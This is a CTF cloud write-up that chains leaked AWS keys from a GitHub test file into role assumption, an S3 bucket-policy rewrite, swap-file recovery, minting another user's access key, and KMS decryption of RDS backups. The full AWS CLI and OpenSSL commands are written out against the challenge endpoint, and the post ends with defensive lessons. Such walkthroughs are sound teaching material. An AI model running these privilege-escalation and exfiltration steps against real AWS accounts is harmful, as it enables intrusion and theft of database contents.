---
title: "SYBank — how a key in a test file cost them the whole database"
date: 2026-09-13
draft: false
description: "PwnSec CTF cloud writeup: leaked AWS creds in a test file chain into role assumption, S3 bucket policy abuse, a recovered Vim swap file, and envelope-encrypted RDS backups decrypted straight through KMS."
tags: ["ctf", "cloud", "aws"]
featureimage: "access-denied.gif"
---

I don't usually go this deep on the cloud challenges because they're either "we hid a flag in an S3 bucket, go find it" or a rabbit hole that needs three IAM PhDs. This one was different. It was a proper chain — the kind of thing that actually happens at work, which is probably why I enjoyed it so much. Every single step was a real mistake I've either seen in a review or, honestly, almost made myself.

So here's how it went. Endpoint for the whole thing was a hosted AWS-compatible box:

```bash
# export AWS_ENDPOINT_URL="https://localhost:8888"   # only if you're running LocalStack yourself
export AWS_ENDPOINT_URL="https://28abecb4e9659ba9.chal.ctf.ae"
```

Set that once and every `aws` command talks to the challenge instead of a real account. If you forget this you'll be very confused when your commands hit actual AWS and get denied, ask me how I know.

## Part 1 — finding the way in

No creds to start with, just a company name and a person. Classic. So it's an OSINT warm-up before you get to touch anything cloudy.

Found the guy's LinkedIn first. Read the bio properly — people always slip something in there, a personal site, a handle, whatever. This one dropped a username: **`blvkrose`**. Cool, that's a thread to pull.

Ran sherlock on it to see where else it lived:

```bash
sherlock blvkrose
```

GitHub came back, which is what I was hoping for. Went digging through the repos, and here's the thing — I almost went straight for the app code, which was a waste of ten minutes. The gold was in the **tests**. It nearly always is. Somebody needed their integration test to actually talk to S3, hardcoded a real key "temporarily," and git remembered it forever:

```python
# tucked into one of the tests/test_*.py files
AWS_ACCESS_KEY_ID     = "AKIA................"
AWS_SECRET_ACCESS_KEY = "................................"
```

I've genuinely done a version of this — not pushed it, thank god, but I've had a real key sitting in a local test file for way too long. It's such an easy trap. Tests are code, public repo is public, and a string that looks like a credential *is* a credential to anyone reading.

That's our foothold.

## Part 2 — okay, who am I?

First move with any AWS key, always:

```bash
aws configure                 # pasted the leaked AKIA key + secret
aws sts get-caller-identity
```

`get-caller-identity` is my `whoami` for AWS. It can't be denied — if the key's valid, it tells you the account ID and exactly which principal you are. Turned out to be some low-level dev identity. Not exciting on its own.

The interesting part with a boring identity is always *what can it turn into*. So I listed roles:

```bash
aws iam list-roles
```

And there it is — `assumeRole-dba`. A DBA role. Roles are supposed to be assumable only by trusted principals, but if the trust policy is loose you can just walk in:

```bash
aws sts assume-role \
  --role-arn arn:aws:iam::000000000000:role/assumeRole-dba \
  --role-session-name dba
```

That spits back temporary creds — access key, secret, and a session token. This is lateral movement, cloud-style: same account, bigger badge. I stashed it as a profile so I could hop between identities without losing my mind:

```bash
aws configure --profile dba          # pasted the assume-role output, session token included
aws sts get-caller-identity --profile dba
aws --profile dba s3 ls
```

Two buckets worth caring about:

```bash
aws --profile dba s3 ls s3://sybank-dev-s3rdsbackupfiles   # encrypted RDS backups
aws --profile dba s3 ls s3://sybank-dev-s3filesharing      # has a .automation.sh.swp
```

That `.automation.sh.swp` made me grin. It's a **Vim swap file**. Every time you open a file in Vim it drops a hidden `.<name>.swp` next to it holding the buffer. So a leftover `.swp` is basically a snapshot of whatever someone was editing — here, an `automation.sh` — and it usually still has the plaintext the real script was hiding.

Problem: I could *list* it as dba but I couldn't actually `GetObject` it. Denied. Sat there for a second annoyed...

![access denied](access-denied.gif)

...and then remembered dba could touch the bucket *policy*.

If you can't read the object but you *can* rewrite the bucket's resource policy, you just grant yourself the read. That's it. dba had `s3:PutBucketPolicy`, so:

```bash
aws --profile dba s3api put-bucket-policy \
  --bucket sybank-dev-s3filesharing \
  --policy '{
    "Version": "2012-10-17",
    "Statement": [{
      "Effect": "Allow",
      "Principal": "*",
      "Action": "s3:GetObject",
      "Resource": "arn:aws:s3:::sybank-dev-s3filesharing/*"
    }]
  }'
```

This one bites people in the real world all the time. Access in S3 is *identity policy OR resource policy* — either one is enough. So `s3:PutBucketPolicy` isn't "manage a setting," it's effectively "read and write everything in this bucket," because whoever has it can just author themselves the permission. I've flagged exactly this in a review before and had someone go "wait, that's it?" Yeah, that's it.

Grabbed the file:

```bash
aws --profile dba s3 cp s3://sybank-dev-s3filesharing/.automation.sh.swp .
```

Recovered the text — `vim -r .automation.sh.swp` works, but honestly `strings` on it was enough to read what mattered. The script referenced a second IAM user, **`dba-sec`**, and dba was allowed to manage it. Which means I didn't need that user's password or existing keys. I just minted a fresh one:

```bash
aws iam create-access-key --user-name dba-sec --profile dba
```

`iam:CreateAccessKey` on *another* user is game over for that user. You can always print yourself a working key for them. It's a favorite persistence trick for a reason.

## Part 3 — becoming sec and grabbing the backups

New key, new profile:

```bash
aws configure --profile sec
aws sts get-caller-identity --profile sec
```

`sec` was more locked down than dba — a plain `s3 ls` just died:

```bash
aws --profile sec s3 ls                                       # AccessDenied
aws --profile sec s3 ls s3://sybank-dev-s3rdsbackupfiles      # this works though
```

Which is fine, that's least-privilege doing its job — sec only has rights on the backups bucket. And that's the bucket I wanted anyway.

The backups sit in timestamped folders. Listed one and looped over it to pull everything down:

```bash
for i in $(aws --profile sec s3 ls s3://sybank-dev-s3rdsbackupfiles/dumps/20260912_194858/ | awk '{print $4}'); do
  aws --profile sec s3 cp s3://sybank-dev-s3rdsbackupfiles/dumps/20260912_194858/$i . ;
done
```

Quick note to save you the headache I gave myself: **list and copy from the same timestamp.** I fat-fingered mine — listed `...194858/` but copied from `...123006/` — and then sat there wondering why nothing downloaded. It wasn't broken, I was just pointing at two different folders. Keep them the same.

Each dump folder had three files:

- `sy_internal_<ts>.keyblob.b64` — the data key, itself encrypted by KMS, base64'd
- `sy_internal_<ts>.globals.sql.enc` — Postgres roles/users, OpenSSL-encrypted
- `sy_internal_<ts>.dump.enc` — the actual `pg_dump`, OpenSSL-encrypted

This is textbook **envelope encryption** — the AWS backup pattern. The data gets encrypted with a random symmetric key, and *that* key gets wrapped by a KMS master key and dropped next to the data as the "key blob." So to read anything you first have to ask KMS to unwrap the key.

And here's the whole point of the challenge, really: sec can *read* the backups **and** sec can *call `kms:Decrypt`*. So the encryption buys them nothing. I just asked KMS nicely:

```bash
aws --profile sec kms decrypt \
  --ciphertext-blob file://sy_internal_20260911_161409.keyblob.b64
```

The `Plaintext` in the response was the data key — came out as `+vQ1WujEvTODEdX3QfVawyt4H1rJaRE59SdOkdLDI4U=`. That base64 string is literally the passphrase the dumps were encrypted with. So OpenSSL, matching how they were encrypted (AES-256-CBC, PBKDF2):

```bash
openssl enc -d -aes-256-cbc -pbkdf2 \
  -pass pass:+vQ1WujEvTODEdX3QfVawyt4H1rJaRE59SdOkdLDI4U= \
  -in sy_internal_20260911_161409.globals.sql.enc -out globals

openssl enc -d -aes-256-cbc -pbkdf2 \
  -pass pass:+vQ1WujEvTODEdX3QfVawyt4H1rJaRE59SdOkdLDI4U= \
  -in sy_internal_20260911_161409.dump.enc -out dump
```

The crypto here is completely fine, by the way. Nothing was broken. The mistake is the *permissions around the key* — the exact same identity that can pull the encrypted backup can also decrypt the key that protects it. Split those two and this step is dead. That's the takeaway I'd write in the postmortem.

While I was in there, sec could also read Secrets Manager, so I checked it for DB creds:

```bash
aws --profile sec secretsmanager list-secrets --region us-east-1
aws --profile sec secretsmanager get-secret-value --secret-id dbsec/database --region us-east-1
```

(Watch the syntax — the name goes in `--secret-id`, `--region` is a flag. I typo'd this two different ways before it worked. `dbsec/database` held the connection details, which just confirmed what I was about to restore.)

## Part 4 — restore it and read the flag

The dump is a normal `pg_dump` custom-format archive, so easiest thing is spin up a throwaway Postgres and restore into it:

```bash
docker run -d \
  --name postgres \
  -e POSTGRES_PASSWORD=root \
  -p 5432:5432 \
  -v ./db:/tmp \
  postgres:latest
```

Two things I tripped on: don't forget the `\` before `postgres:latest` (without it the volume line eats the image name), and the `-v ./db:/tmp` means "my local `./db` shows up as `/tmp` in the container" — so drop `globals` and `dump` into `./db` and they'll be at `/tmp/globals` and `/tmp/dump` inside.

Then shell in and restore in order. Globals first, because they create the roles the dump expects to own things — skip this and `pg_restore` throws a wall of "role does not exist" warnings:

```bash
docker exec -it postgres bash

psql -U postgres -f /tmp/globals          # roles/users first
createdb -U postgres sy_internal          # make the target DB
pg_restore -U postgres -d sy_internal --clean --if-exists /tmp/dump
psql -U postgres -d sy_internal           # poke around
```

From there it's just SQL:

```sql
\dt
SELECT * FROM <the table that obviously holds it>;
```

Flag was sitting in one of the restored tables. `CTF{...}`.

## Looking back

What I like about this one is there's no single "hack" — it's six small, boring, realistic mistakes stacked on top of each other:

1. A live key committed into a test file.
2. A role anyone-ish could assume.
3. `s3:PutBucketPolicy` handed out like it's harmless (it is not).
4. An editor swap file left in shared storage, plus `iam:CreateAccessKey` on another user.
5. The backup reader also holding `kms:Decrypt`.
6. And then the reminder that a recoverable backup is just plaintext with extra steps.

Any *one* of those broken and the chain snaps. Which is kind of the whole lesson — you don't defend against "the attack," you defend against each little link. Scan for secrets before you push. Scope your trust policies. Treat `PutBucketPolicy` and `CreateAccessKey` as admin, because they are. Keep temp files out of buckets. And for the love of everything, don't let the same role read the backup *and* unwrap its key.

Good challenge. Would've saved myself 15 minutes if I'd just read the tests first and matched my folder timestamps, but that's CTFs for you.
